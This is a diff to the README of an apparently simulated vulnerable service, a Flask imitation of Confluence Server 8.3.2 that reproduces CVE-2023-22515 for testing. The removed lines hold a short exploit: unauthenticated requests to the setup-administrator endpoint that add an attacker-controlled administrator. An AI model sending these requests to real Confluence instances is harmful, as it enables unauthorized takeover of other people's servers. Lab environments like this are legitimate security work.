@@ -24,13 +24,6 @@ unauthenticated setup-reopen and admin-creation requests and **mutates real
 server state** (a new administrator is added to the instance's admin set). It
 is a simulation of CVE-2023-22515, not a real Confluence server.
 
-Exploit (unauthenticated):
-```
-GET  /setup/setupadministrator.action?trigger=true
-POST /setup/setupadministrator.action   (username=attacker&password=...)
-```
-The new admin then appears in `/rest/api/admins`.
-
 ## Affected Service
 - **Service:** Confluence Server 8.3.2 (simulated with Python/Flask)
 - **Port:** 8090/TCP
